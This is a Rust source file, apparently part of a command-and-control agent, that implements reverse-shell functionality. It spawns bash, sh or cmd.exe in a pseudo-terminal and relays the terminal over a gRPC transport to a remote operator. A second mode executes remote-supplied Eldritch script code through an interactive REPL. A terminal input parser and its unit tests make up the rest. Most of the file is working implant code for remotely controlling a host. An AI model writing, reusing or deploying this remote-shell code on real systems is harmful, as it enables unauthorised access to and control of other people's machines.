use anyhow::Result;
use pb::c2::{ReverseShellMessageKind, ReverseShellRequest, ReverseShellResponse};
use portable_pty::{native_pty_system, CommandBuilder, PtySize};
use std::io::{Read, Write};
use std::path::Path;
use transport::Transport;

use crossterm::{
    cursor,
    style::{Color, SetForegroundColor},
    terminal, QueueableCommand,
};
use eldritch_core::Value;
use eldritch_repl::{Input, Repl, ReplAction};
use eldritchv2::Interpreter;

pub async fn run_reverse_shell_pty<T: Transport>(
    task_id: i64,
    cmd: Option<String>,
    mut transport: T,
) -> Result<()> {
    // Channels to manage gRPC stream
    let (output_tx, output_rx) = tokio::sync::mpsc::channel(1);
    let (input_tx, mut input_rx) = tokio::sync::mpsc::channel(1);
    // We will recreate the internal channels needed for the loop.
    let (internal_exit_tx, mut internal_exit_rx) = tokio::sync::mpsc::channel(1);

    #[cfg(debug_assertions)]
    log::info!("starting reverse_shell_pty (task_id={})", task_id);

    // First, send an initial registration message
    if let Err(_err) = output_tx
        .send(ReverseShellRequest {
            task_id,
            kind: ReverseShellMessageKind::Ping.into(),
            data: Vec::new(),
        })
        .await
    {
        #[cfg(debug_assertions)]
        log::error!("failed to send initial registration message: {}", _err);
    }

    // Use the native pty implementation for the system
    let pty_system = native_pty_system();

    // Create a new pty
    let pair = match pty_system.openpty(PtySize {
        rows: 24,
        cols: 80,
        pixel_width: 0,
        pixel_height: 0,
    }) {
        Ok(p) => p,
        Err(e) => {
            return Err(e.into());
        }
    };

    // Spawn command into the pty
    let cmd_builder = match cmd {
        Some(c) => CommandBuilder::new(c),
        None => {
            #[cfg(not(target_os = "windows"))]
            {
                if Path::new("/bin/bash").exists() {
                    CommandBuilder::new("/bin/bash")
                } else {
                    CommandBuilder::new("/bin/sh")
                }
            }
            #[cfg(target_os = "windows")]
            CommandBuilder::new("cmd.exe")
        }
    };

    let mut child = match pair.slave.spawn_command(cmd_builder) {
        Ok(c) => c,
        Err(e) => {
            return Err(e.into());
        }
    };

    let mut reader = match pair.master.try_clone_reader() {
        Ok(r) => r,
        Err(e) => {
            return Err(e.into());
        }
    };
    let mut writer = match pair.master.take_writer() {
        Ok(w) => w,
        Err(e) => {
            return Err(e.into());
        }
    };

    // Spawn task to send PTY output
    const CHUNK_SIZE: usize = 1024;
    tokio::spawn(async move {
        loop {
            let mut buffer = [0; CHUNK_SIZE];
            let n = match reader.read(&mut buffer[..]) {
                Ok(n) => n,
                Err(_err) => {
                    #[cfg(debug_assertions)]
                    log::error!("failed to read pty: {}", _err);
                    break;
                }
            };

            if n < 1 {
                match internal_exit_rx.try_recv() {
                    Ok(None) | Err(tokio::sync::mpsc::error::TryRecvError::Empty) => {}
                    Ok(Some(_status)) => {
                        #[cfg(debug_assertions)]
                        log::info!("closing output stream, pty exited: {}", _status);
                        break;
                    }
                    Err(tokio::sync::mpsc::error::TryRecvError::Disconnected) => {
                        #[cfg(debug_assertions)]
                        log::info!("closing output stream, exit channel closed");
                    }
                }
                continue;
            }

            if let Err(_err) = output_tx
                .send(ReverseShellRequest {
                    kind: ReverseShellMessageKind::Data.into(),
                    data: buffer[..n].to_vec(),
                    task_id,
                })
                .await
            {
                #[cfg(debug_assertions)]
                log::error!("reverse_shell_pty output failed to queue: {}", _err);
                break;
            }

            // Ping to flush
            if let Err(_err) = output_tx
                .send(ReverseShellRequest {
                    kind: ReverseShellMessageKind::Ping.into(),
                    data: Vec::new(),
                    task_id,
                })
                .await
            {
                #[cfg(debug_assertions)]
                log::error!("reverse_shell_pty ping failed: {}", _err);
                break;
            }
        }
    });

    // Initiate gRPC stream
    if let Err(e) = transport.reverse_shell(output_rx, input_tx).await {
        let _ = child.kill();
        return Err(e.into());
    }

    // Handle Input
    loop {
        if let Ok(Some(_status)) = child.try_wait() {
            #[cfg(debug_assertions)]
            log::info!("closing input stream, pty exited: {}", _status);
            break;
        }

        if let Some(msg) = input_rx.recv().await {
            if msg.kind == ReverseShellMessageKind::Ping as i32 {
                continue;
            }
            if let Err(_err) = writer.write_all(&msg.data) {
                #[cfg(debug_assertions)]
                log::error!("reverse_shell_pty failed to write input: {}", _err);
            }
        } else {
            let _ = child.kill();
            break;
        }
    }

    let status = child.wait().ok();
    if let Some(s) = status {
        let _ = internal_exit_tx.send(Some(s)).await;
    }

    #[cfg(debug_assertions)]
    log::info!("stopping reverse_shell_pty (task_id={})", task_id);
    Ok(())
}

pub async fn run_repl_reverse_shell<T: Transport>(task_id: i64, mut transport: T) -> Result<()> {
    // Channels to manage gRPC stream
    let (output_tx, output_rx) = tokio::sync::mpsc::channel(1);
    let (input_tx, input_rx) = tokio::sync::mpsc::channel(1);

    #[cfg(debug_assertions)]
    log::info!("starting repl_reverse_shell (task_id={})", task_id);

    // Initial Registration
    if let Err(_err) = output_tx
        .send(ReverseShellRequest {
            task_id,
            kind: ReverseShellMessageKind::Ping.into(),
            data: Vec::new(),
        })
        .await
    {
        #[cfg(debug_assertions)]
        log::error!("failed to send initial registration message: {}", _err);
    }

    // Initiate gRPC stream
    if let Err(e) = transport.reverse_shell(output_rx, input_tx).await {
        return Err(e.into());
    }

    // Move logic to blocking thread
    run_repl_loop(task_id, input_rx, output_tx).await;
    Ok(())
}

async fn run_repl_loop(
    task_id: i64,
    mut input_rx: tokio::sync::mpsc::Receiver<ReverseShellResponse>,
    output_tx: tokio::sync::mpsc::Sender<ReverseShellRequest>,
) {
    let _ = tokio::task::spawn_blocking(move || {
        let mut interpreter = Interpreter::new().with_default_libs();
        let mut repl = Repl::new();
        let mut stdout = VtWriter {
            tx: output_tx,
            task_id,
        };

        let _ = render(&mut stdout, &repl);

        // State machine for VT100 parsing
        let mut parser = InputParser::new();

        while let Some(msg) = input_rx.blocking_recv() {
            if msg.kind == ReverseShellMessageKind::Ping as i32 {
                continue;
            }
            if msg.data.is_empty() {
                continue;
            }

            // Parse input
            let inputs = parser.parse(&msg.data);
            for input in inputs {
                match repl.handle_input(input) {
                    ReplAction::Quit => return,
                    ReplAction::Submit { code, .. } => {
                        // Move to next line
                        let _ = stdout.queue(cursor::MoveToNextLine(1));
                        let _ = stdout.flush();

                        // Execute
                        match interpreter.interpret(&code) {
                            Ok(v) => {
                                if !matches!(v, Value::None) {
                                    let s = format!("{:?}\r\n", v);
                                    let _ = stdout.write(s.as_bytes());
                                }
                            }
                            Err(e) => {
                                let s = format!("Error: {}\r\n", e);
                                let _ = stdout.write(s.as_bytes());
                            }
                        }
                        let _ = render(&mut stdout, &repl);
                    }
                    ReplAction::AcceptLine { .. } => {
                        let _ = stdout.queue(cursor::MoveToNextLine(1));
                        let _ = render(&mut stdout, &repl);
                    }
                    ReplAction::Render => {
                        let _ = render(&mut stdout, &repl);
                    }
                    ReplAction::ClearScreen => {
                        let _ = stdout.queue(terminal::Clear(terminal::ClearType::All));
                        let _ = stdout.queue(cursor::MoveTo(0, 0));
                        let _ = render(&mut stdout, &repl);
                    }
                    ReplAction::Complete => {
                        let state = repl.get_render_state();
                        let (start, completions) = interpreter.complete(&state.buffer, state.cursor);
                        repl.set_suggestions(completions, start);
                        let _ = render(&mut stdout, &repl);
                    }
                    ReplAction::None => {}
                }
            }
        }
    })
    .await;
}

struct VtWriter {
    tx: tokio::sync::mpsc::Sender<ReverseShellRequest>,
    task_id: i64,
}

impl std::io::Write for VtWriter {
    fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
        let data = buf.to_vec();
        match self.tx.blocking_send(ReverseShellRequest {
            kind: ReverseShellMessageKind::Data.into(),
            data,
            task_id: self.task_id,
        }) {
            Ok(_) => Ok(buf.len()),
            Err(e) => Err(std::io::Error::new(std::io::ErrorKind::BrokenPipe, e)),
        }
    }

    fn flush(&mut self) -> std::io::Result<()> {
        match self.tx.blocking_send(ReverseShellRequest {
            kind: ReverseShellMessageKind::Ping.into(),
            data: Vec::new(),
            task_id: self.task_id,
        }) {
            Ok(_) => Ok(()),
            Err(e) => Err(std::io::Error::new(std::io::ErrorKind::BrokenPipe, e)),
        }
    }
}

struct InputParser {
    buffer: Vec<u8>,
}

impl InputParser {
    fn new() -> Self {
        Self { buffer: Vec::new() }
    }

    fn parse(&mut self, data: &[u8]) -> Vec<Input> {
        self.buffer.extend_from_slice(data);
        let mut inputs = Vec::new();
        let mut i = 0;
        while i < self.buffer.len() {
            let b = self.buffer[i];
            if b == 0x1b {
                // Escape sequence
                if i + 1 >= self.buffer.len() {
                    break; // Incomplete
                }

                let prefix = self.buffer[i + 1];
                if prefix == b'[' || prefix == b'O' {
                    if i + 2 >= self.buffer.len() {
                        break; // Incomplete
                    }
                    let code = self.buffer[i + 2];

                    // Handle Cursor Keys & Home/End (standard)
                    let input = match code {
                        b'A' => Some(Input::Up),
                        b'B' => Some(Input::Down),
                        b'C' => Some(Input::Right),
                        b'D' => Some(Input::Left),
                        b'H' => Some(Input::Home),
                        b'F' => Some(Input::End),
                        _ => None,
                    };

                    if let Some(inp) = input {
                        inputs.push(inp);
                        i += 3;
                        continue;
                    }

                    // Handle ~ terminated sequences (e.g. [3~ for Delete)
                    if prefix == b'[' && (code >= b'0' && code <= b'9') {
                        // Scan for ~
                        let mut j = i + 3;
                        let mut found_tilde = false;
                        while j < self.buffer.len() && j < i + 8 {
                            if self.buffer[j] == b'~' {
                                found_tilde = true;
                                break;
                            }
                            j += 1;
                        }

                        if !found_tilde {
                            if j >= self.buffer.len() {
                                break; // Incomplete
                            }
                            // Garbage or unsupported long sequence, consume ESC to skip
                            i += 1;
                            continue;
                        }

                        // Parse number
                        let num_slice = &self.buffer[i + 2..j];
                        if num_slice == b"3" {
                            inputs.push(Input::Delete);
                        } else if num_slice == b"1" || num_slice == b"7" {
                            inputs.push(Input::Home);
                        } else if num_slice == b"4" || num_slice == b"8" {
                            inputs.push(Input::End);
                        }
                        // Ignore others (PageUp/Down/Insert) for now
                        i = j + 1;
                        continue;
                    }

                    // Unknown [ or O sequence
                    i += 1;
                    continue;
                } else {
                    // Unknown ESC sequence
                    i += 1;
                    continue;
                }
            } else if b == b'\r' || b == b'\n' {
                inputs.push(Input::Enter);
                i += 1;
            } else if b == 0x7f || b == 0x08 {
                inputs.push(Input::Backspace);
                i += 1;
            } else if b == 0x03 {
                inputs.push(Input::Cancel);
                i += 1;
            } else if b == 0x04 {
                inputs.push(Input::EOF);
                i += 1;
            } else if b == 0x0c {
                inputs.push(Input::ClearScreen);
                i += 1;
            } else if b == 0x09 {
                inputs.push(Input::Tab);
                i += 1;
            } else if b == 0x00 {
                // Ctrl+Space
                inputs.push(Input::ForceComplete);
                i += 1;
            } else {
                inputs.push(Input::Char(b as char));
                i += 1;
            }
        }
        // Drain processed
        self.buffer = self.buffer.split_off(i);
        inputs
    }
}

fn render<W: std::io::Write>(stdout: &mut W, repl: &Repl) -> std::io::Result<()> {
    let state = repl.get_render_state();

    // Clear everything below the current line to clear old suggestions
    stdout.queue(terminal::Clear(terminal::ClearType::FromCursorDown))?;

    stdout.queue(terminal::Clear(terminal::ClearType::CurrentLine))?;
    stdout.queue(cursor::MoveToColumn(0))?;

    // Write prompt (Blue)
    stdout.queue(SetForegroundColor(Color::Blue))?;
    stdout.write_all(state.prompt.as_bytes())?;
    stdout.queue(SetForegroundColor(Color::Reset))?;

    // Write buffer
    stdout.write_all(state.buffer.as_bytes())?;

    // Render suggestions if any
    if let Some(suggestions) = &state.suggestions {
        // Save cursor position
        stdout.queue(cursor::SavePosition)?;
        stdout.queue(cursor::MoveToNextLine(1))?;
        stdout.queue(cursor::MoveToColumn(0))?;

        if !suggestions.is_empty() {
             for (i, s) in suggestions.iter().take(10).enumerate() {
                 if i > 0 {
                    stdout.write_all(b"  ")?;
                 }
                 if Some(i) == state.suggestion_idx {
                    // Highlight selected (Black on White)
                     stdout.queue(crossterm::style::SetBackgroundColor(Color::White))?;
                     stdout.queue(SetForegroundColor(Color::Black))?;
                     stdout.write_all(s.as_bytes())?;
                     stdout.queue(crossterm::style::SetBackgroundColor(Color::Reset))?;
                     stdout.queue(SetForegroundColor(Color::Reset))?;
                 } else {
                     stdout.write_all(s.as_bytes())?;
                 }
             }
             if suggestions.len() > 10 {
                 stdout.write_all(b" ...")?;
             }
        }

        // Restore cursor
        stdout.queue(cursor::RestorePosition)?;
    }

    let cursor_col = state.prompt.len() as u16 + state.cursor as u16;
    stdout.queue(cursor::MoveToColumn(cursor_col))?;

    stdout.flush()?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_input_parser_application_cursor_keys() {
        let mut parser = InputParser::new();
        // Up arrow in Application Mode: \x1bOA
        let inputs = parser.parse(b"\x1bOA");
        assert_eq!(inputs.len(), 1, "Expected 1 input (Up), got {:?}", inputs);
        assert_eq!(inputs[0], Input::Up);
    }

    #[test]
    fn test_input_parser_delete_key() {
        let mut parser = InputParser::new();
        // Delete key: \x1b[3~
        let inputs = parser.parse(b"\x1b[3~");
        assert_eq!(inputs.len(), 1, "Expected 1 input (Delete), got {:?}", inputs);
        assert_eq!(inputs[0], Input::Delete);
    }

    #[test]
    fn test_input_parser_home_end() {
        let mut parser = InputParser::new();
        // Home (xterm): \x1bOH
        let inputs = parser.parse(b"\x1bOH");
        assert_eq!(inputs.len(), 1, "Expected 1 input (Home), got {:?}", inputs);
        assert_eq!(inputs[0], Input::Home);

        // End (xterm): \x1bOF
        let mut parser = InputParser::new();
        let inputs = parser.parse(b"\x1bOF");
        assert_eq!(inputs.len(), 1, "Expected 1 input (End), got {:?}", inputs);
        assert_eq!(inputs[0], Input::End);
    }

    #[test]
    fn test_input_parser_split_packet() {
        let mut parser = InputParser::new();
        // Packet 1: \x1b
        let inputs = parser.parse(b"\x1b");
        assert_eq!(inputs.len(), 0, "Should buffer incomplete sequence");

        // Packet 2: [A
        let inputs = parser.parse(b"[A");
        assert_eq!(inputs.len(), 1, "Should complete sequence");
        assert_eq!(inputs[0], Input::Up);
    }
}
